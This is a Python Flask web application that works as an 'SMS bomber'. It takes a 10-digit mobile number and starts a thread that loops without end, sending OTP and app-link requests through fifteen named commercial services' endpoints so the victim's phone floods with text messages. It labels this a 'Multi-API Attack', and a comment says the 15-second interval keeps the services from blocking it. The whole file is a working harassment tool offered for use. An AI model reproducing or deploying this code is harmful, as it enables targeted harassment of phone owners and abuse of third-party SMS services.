import os
import time
import requests
import threading
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)
active_tasks = {}

def send_bomber(mobile):
    count = 1
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Accept": "*/*"
    }

    while active_tasks.get(mobile):
        print(f"--- Bombing Round {count} Started for {mobile} ---")
        
        # 1. JustDial (GET)
        try: session.get(f"https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile={mobile}", headers=headers, timeout=5)
        except: pass

        # 2. ConfirmTkt (POST)
        try: session.post("https://securedapi.confirmtkt.com/api/platform/register", json={"mobileNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # 3. Allen Solly (POST)
        try: session.post("https://www.allensolly.com/capillarylogin/validateMobileOrEMail", data={"mobileoremail": mobile}, headers=headers, timeout=5)
        except: pass

        # 4. Housing.com (POST)
        try: session.post("https://login.housing.com/api/v2/send-otp", json={"phone": mobile}, headers=headers, timeout=5)
        except: pass

        # 5. Ajio (POST)
        try: session.post("https://login.web.ajio.com/api/auth/signupSendOTP", json={"mobileNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # 6. Unacademy (POST)
        try: session.post("https://unacademy.com/api/v1/user/get_app_link/", data={"phone": mobile}, headers=headers, timeout=5)
        except: pass

        # 7. Treebo (POST)
        try: session.post("https://www.treebo.com/api/v2/auth/login/otp/", json={"phone_number": mobile}, headers=headers, timeout=5)
        except: pass

        # 8. PharmEasy (POST)
        try: session.post("https://pharmeasy.in/api/auth/requestOTP", json={"contactNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # 9. Dream11 (POST)
        try: session.post("https://api.dream11.com/sendsmslink", json={"mobileNum": mobile}, headers=headers, timeout=5)
        except: pass

        # 10. Cashify (GET)
        try: session.get(f"https://www.cashify.in/api/cu01/v1/app-link?mn={mobile}", headers=headers, timeout=5)
        except: pass

        # 11. KFC (POST)
        try: session.post("https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin", json={"phoneNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # 12. Airtel (GET)
        try: session.get(f"https://www.airtel.in/referral-api/core/notify?messageId=map&rtn={mobile}", headers=headers, timeout=5)
        except: pass

        # 13. HappyEasyGo (GET)
        try: session.get(f"https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91{mobile}", headers=headers, timeout=5)
        except: pass

        # 14. Porter (POST)
        try: session.post("https://porter.in/restservice/send_app_link_sms", json={"phone": mobile}, headers=headers, timeout=5)
        except: pass

        # 15. IndiaLends (POST)
        try: session.post("https://indialends.com/internal/a/mobile-verification_v2.ashx", data={"jfsdfu14hkgertd": mobile}, headers=headers, timeout=5)
        except: pass

        print(f"Round {count} Finished.")
        count += 1
        time.sleep(15) # Safe gap taaki saari APIs block na hon

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_bomber():
    mobile = request.form.get('mobile')
    if not mobile or len(mobile) != 10:
        return jsonify({"status": "error", "message": "Invalid 10-digit Number"})
    
    if mobile not in active_tasks or not active_tasks[mobile]:
        active_tasks[mobile] = True
        threading.Thread(target=send_bomber, args=(mobile,)).start()
        return jsonify({"status": "success", "message": f"Multi-API Attack Started on {mobile}"})
    return jsonify({"status": "info", "message": "Already running"})

@app.route('/stop', methods=['POST'])
def stop_bomber():
    mobile = request.form.get('mobile')
    active_tasks[mobile] = False
    return jsonify({"status": "success", "message": "Attack Stopped"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
